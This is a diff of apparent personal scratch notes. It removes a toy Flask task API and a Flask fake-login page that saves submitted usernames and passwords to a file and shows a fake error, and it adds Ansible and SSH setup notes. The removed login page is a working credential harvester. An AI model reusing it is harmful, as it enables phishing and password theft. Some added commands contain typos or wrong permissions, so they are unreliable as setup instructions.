@@ -68,69 +68,54 @@ pipeline {
 
 
 
-from flask import Flask,jsonify,request
-app=Flask(__name__)
-tasks=[{'id':1,'task':'task1','description':'Task1 description'},{'id':2,'task':'task2','description':'Task2 description'},{'id':3,'task':'task3','description':'Task3 description'}]
-
-@app.route('/get_all_tasks',methods=['GET'])
-def get_all_tasks():
-    return jsonify({'tasks':tasks})
-
-@app.route('/get_task/<int:task_id>',methods=['GET'])
-def get_task(task_id):
-    task=next((task for task in tasks if task['id']==task_id),None)
-    if task:
-        return jsonify({'task':task})
-    else:
-        return jsonify({'message':'Task not found'})
-
-@app.route('/create_task',methods=['POST'])
-def create_task():
-    data = request.json
-    task={'id':len(tasks)+1,'task':data['task'],'description':data['description']}
-    tasks.append(task)
-    return jsonify({'message':'Task Created Succussfully','task':task})
-
-@app.route('/update_task/<int:task_id>',methods=['PUT'])
-def update_task(task_id):
-    task=next((task for task in tasks if task['id']==task_id),None)
-    if task:
-        data = request.json
-        task.update(data)
-        return jsonify({'message':'update success'})
-    else:
-        return jsonify({'message':'task not found'})
-
-@app.route('/delete_task/<int:task_id>',methods=['DELETE'])
-def delete_task(task_id):
-    global tasks
-    tasks=[task for task in tasks if task['id']!=task_id]
-    return jsonify({'message':'deleted sucess'})
-if __name__ == '__main__':
-    app.run()
 
 
+$ sudo apt update
+$ sudo apt install software-properties-common
+$ sudo add-apt-repository --yes --update ppa:ansible/ansible
+$ sudo apt install ansible
+
+su
+sudo usermod -aG sudo “username”
+su “username”
+
+ansible - - version
+
+• sudo nano /etc/default/locale
+• Update the encoding to UTF-8
+LANG="en_US.UTF-8"
+LC_CTYPE="en.US.UTF-8"
+
+ssh-keygen -t rsa -C "devops default"
+ls -la .ssh
+cat .ssh/id_rsa.pub
+cat .ssh/id_rsa
+
+ssh-copy-id -i ~/.ssh/id_rsa.pub "ipaddress"
+
+ssh -i ~/.ssh/"keyname" "ipaddress"
+
+ssh "Ip address"
+
+sudo nano inventory
+[servers]
+192.168.1.219
+192.168.1.218
+
+ansible all --key-file ~/.ssh/id_rsa -i inventory -m ping
+chmod 600 ~/.ssh
+
+# 9. Create playbook
+nano playbook.yaml
+
+# Inside the playbook:
+- name: Echo
+  hosts: servers
+  connection: local
+  tasks:
+    - name: task created
+      debug:
+        msg: "hello buddy"
 
 
-/^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{4,15}$/
-
-
-
-from flask import Flask, render_template, request, redirect 
-app = Flask(__name__) 
-@app.route('/', methods=['GET', 'POST']) 
-def login(): 
-    if request.method == 'POST': 
-        username = request.form.get('username') 
-        password = request.form.get('password') 
-# Simulated logging of credentials (for demo/testing only) 
-        with open('captured.txt', 'a') as f: 
-            f.write(f"Username: {username}, Password: {password}\n") 
-# Redirect to a fake "loading" or "error" page 
-        return redirect('/oops') 
-    return render_template('login.html') 
-@app.route('/oops') 
-def oops(): 
-    return "<h2>Oops! Something went wrong. Please try again later.</h2>" 
-if __name__ == '__main__': 
-    app.run(debug=True) 
+ansible-playbook -i inventory playbook.yml
